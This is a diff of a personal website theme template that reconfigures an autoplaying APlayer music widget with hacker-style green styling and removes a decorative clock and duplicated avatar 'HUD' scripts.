             window.ap = new APlayer({
-                container: document.getElementById('aplayer-fixed'),
-                fixed: true,
-                autoplay: true,
-                theme: '#00ff41',
-                loop: 'all',
-                order: 'list',
-                preload: 'auto',
-                volume: 0.5,
-                mutex: true,
-                listFolded: true,
-                audio: [
-                    
-                    {
-                        name: 'Người tình mùa đông',
-                        artist: 'Hà Anh Tuấn',
-                        url: 'music/nhac.mp3', 
-                        cover: 'images/cover.png'
-                    },
-                    
-                ]
+                container: document.getElementById('aplayer-fixed'), fixed: true, autoplay: true, theme: '#00ff41', loop: 'all', order: 'list', preload: 'auto', volume: 0.5, mutex: true, listFolded: true,
+                audio: [ { name: 'Cyberpunk City', artist: 'Hacker', url: '/music/song.mp3', cover: '/images/cover.jpg' } ]
             });
-
-            
-            document.body.addEventListener('click', function() {
-                window.ap.play();
-            }, { once: true });
+            document.body.addEventListener('click', function() { window.ap.play(); }, { once: true });
         }
-        
-        
-        initCyberClock();
+        initAllWidgets();
     });
 
-    
-    
     document.addEventListener('pjax:complete', function() {
-        initCyberClock();
+        initAllWidgets();
     });
 </script>
-
 <style>
-     
     .aplayer { background: rgba(0, 0, 0, 0.9) !important; border: 1px solid #00ff41 !important; box-shadow: 0 0 10px rgba(0, 255, 65, 0.2) !important; color: #00ff41 !important; font-family: 'Courier New', monospace !important; z-index: 99999 !important; }
     .aplayer .aplayer-info .aplayer-music .aplayer-title { color: #00ff41 !important; }
     .aplayer .aplayer-info .aplayer-music .aplayer-author { color: #008f11 !important; }
     .aplayer .aplayer-lrc { display: none !important; }
     .aplayer .aplayer-bar-wrap .aplayer-bar { background: #333 !important; }
-    .aplayer .aplayer-bar-wrap .aplayer-bar .aplayer-loaded { background: #555 !important; }
     .aplayer .aplayer-bar-wrap .aplayer-bar .aplayer-played { background: #00ff41 !important; box-shadow: 0 0 10px #00ff41; }
-    .aplayer .aplayer-bar-wrap .aplayer-bar .aplayer-played .aplayer-thumb { background: #00ff41 !important; border: 2px solid #000 !important; }
-    .aplayer .aplayer-pic .aplayer-button { background: rgba(0,0,0,0.5) !important; border: 1px solid #00ff41 !important; }
-    .aplayer .aplayer-pic .aplayer-button path { fill: #00ff41 !important; }
-    .aplayer-list { background: #000000 !important; border-top: 1px solid #00ff41 !important; }
+    .aplayer .aplayer-bar-wrap .aplayer-bar .aplayer-played .aplayer-thumb { background: #00ff41 !important; border: 1px solid #000 !important; }
+    .aplayer-list { background: #000 !important; border-top: 1px solid #00ff41 !important; }
     .aplayer-list ol li { border-bottom: 1px dashed #333 !important; }
     .aplayer-list ol li:hover { background: rgba(0, 255, 65, 0.1) !important; }
-    .aplayer-list ol li.aplayer-list-light { background: rgba(0, 255, 65, 0.2) !important; }
-    .aplayer-list ol li .aplayer-list-title { color: #00ff41 !important; }
-    .aplayer-list ol li .aplayer-list-index { color: #00ff41 !important; }
-    .aplayer-list ol li .aplayer-list-author { color: #008f11 !important; }
 </style>
-
-
-<script>
-    function initCyberClock() {
-        
-        if (document.getElementById('cyber-clock-container')) return;
-
-        
-        const navMenu = document.querySelector('.nav') || document.querySelector('nav');
-        
-        if (navMenu) {
-            
-            const clockDiv = document.createElement('div');
-            clockDiv.id = 'cyber-clock-container';
-            clockDiv.innerHTML = `
-                <div class="cyber-time">
-                    <span id="cyber-hours">00</span><span class="blink">:</span><span id="cyber-minutes">00</span><span class="blink">:</span><span id="cyber-seconds">00</span>
-                </div>
-                <div class="cyber-date" id="cyber-date">YYYY-MM-DD</div>
-            `;
-            
-            
-            navMenu.appendChild(clockDiv);
-            
-            
-            function updateTime() {
-                const now = new Date();
-                
-                const h = String(now.getHours()).padStart(2, '0');
-                const m = String(now.getMinutes()).padStart(2, '0');
-                const s = String(now.getSeconds()).padStart(2, '0');
-                
-                const year = now.getFullYear();
-                const month = String(now.getMonth() + 1).padStart(2, '0');
-                const day = String(now.getDate()).padStart(2, '0');
-                
-                const hEl = document.getElementById('cyber-hours');
-                const mEl = document.getElementById('cyber-minutes');
-                const sEl = document.getElementById('cyber-seconds');
-                const dEl = document.getElementById('cyber-date');
-                
-                if(hEl && mEl && sEl && dEl) {
-                    hEl.innerText = h;
-                    mEl.innerText = m;
-                    sEl.innerText = s;
-                    dEl.innerText = `-- ${year}-${month}-${day} --`;
-                }
-            }
-            
-            setInterval(updateTime, 1000);
-            updateTime(); 
-        }
-    }
-</script>
-
-<style>
-     
-    #cyber-clock-container {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        margin-top: 15px;
-        padding: 5px;
-        font-family: 'Courier New', monospace;
-        color: #00ff41;
-        text-shadow: 0 0 5px #00ff41;
-        border-top: 1px dashed rgba(0, 255, 65, 0.3);
-        
-         
-        width: 100%; 
-        order: 999;  
-    }
-
-    .cyber-time {
-        font-size: 2.5em;
-        font-weight: bold;
-        letter-spacing: 2px;
-    }
-
-    .cyber-date {
-        font-size: 1.5em;
-        opacity: 0.8;
-        letter-spacing: 1px;
-    }
-
-     
-    .blink {
-        animation: blink-anim 1s infinite;
-    }
-
-    @keyframes blink-anim {
-        0%, 100% { opacity: 1; }
-        50% { opacity: 0; }
-    }
-    
-     
-    @media screen and (max-width: 480px) {
-        #cyber-clock-container {
-            font-size: 0.8em;
-        }
-    }
-</style>
-
-<script>
-    document.addEventListener("DOMContentLoaded", function() {
-        
-        const profileImg = document.querySelector('.profile img');
-        
-        
-        if (profileImg && !document.querySelector('.avatar-wrapper-hud')) {
-            
-            
-            const wrapper = document.createElement('div');
-            wrapper.className = 'avatar-wrapper-hud';
-            
-            
-            const leftDeco = document.createElement('div');
-            leftDeco.className = 'avatar-deco deco-left';
-            leftDeco.innerHTML = `
-                <div class="hud-text">:: BIO-SCAN ::</div>
-                <div class="hud-anim-box">
-                    <div class="scan-line"></div>
-                    <div class="data-row">ID: P1C0L0</div>
-                    <div class="data-row">STATUS: ONLINE</div>
-                </div>
-            `;
-            
-            
-            const rightDeco = document.createElement('div');
-            rightDeco.className = 'avatar-deco deco-right';
-            rightDeco.innerHTML = `
-                <div class="hud-text">:: SYS-ANALYSIS ::</div>
-                <div class="hud-anim-box">
-                    <div class="scan-line delay"></div>
-                    <div class="data-row align-right">THREAT: NONE</div>
-                    <div class="data-row align-right">ACCESS: GRANTED</div>
-                </div>
-            `;
-            
-            
-            
-            profileImg.parentNode.insertBefore(wrapper, profileImg);
-            
-            wrapper.appendChild(leftDeco);
-            wrapper.appendChild(profileImg); 
-            wrapper.appendChild(rightDeco);
-        }
-    });
-</script>
-
-<script>
-    document.addEventListener("DOMContentLoaded", function() {
-        
-        const profileImg = document.querySelector('.profile img');
-        
-        
-        if (profileImg && !document.querySelector('.avatar-wrapper-hud')) {
-            
-            
-            const wrapper = document.createElement('div');
-            wrapper.className = 'avatar-wrapper-hud';
-            
-            
-            const leftDeco = document.createElement('div');
-            leftDeco.className = 'avatar-deco deco-left';
-            leftDeco.innerHTML = `
-                <div class="hud-text">:: BIO-SCAN ::</div>
-                <div class="hud-anim-box">
-                    <div class="scan-line"></div>
-                    <div class="data-row">ID: P1C0L0</div>
-                    <div class="data-row">STATUS: ONLINE</div>
-                </div>
-            `;
-            
-            
-            const rightDeco = document.createElement('div');
-            rightDeco.className = 'avatar-deco deco-right';
-            rightDeco.innerHTML = `
-                <div class="hud-text">:: SYS-ANALYSIS ::</div>
-                <div class="hud-anim-box">
-                    <div class="scan-line delay"></div>
-                    <div class="data-row align-right">THREAT: NONE</div>
-                    <div class="data-row align-right">ACCESS: GRANTED</div>
-                </div>
-            `;
-            
-            
-            
-            profileImg.parentNode.insertBefore(wrapper, profileImg);
-            
-            wrapper.appendChild(leftDeco);
-            wrapper.appendChild(profileImg); 
-            wrapper.appendChild(rightDeco);
-        }
-    });
-</script>
 
 <script>
     let menu = document.getElementById('menu');
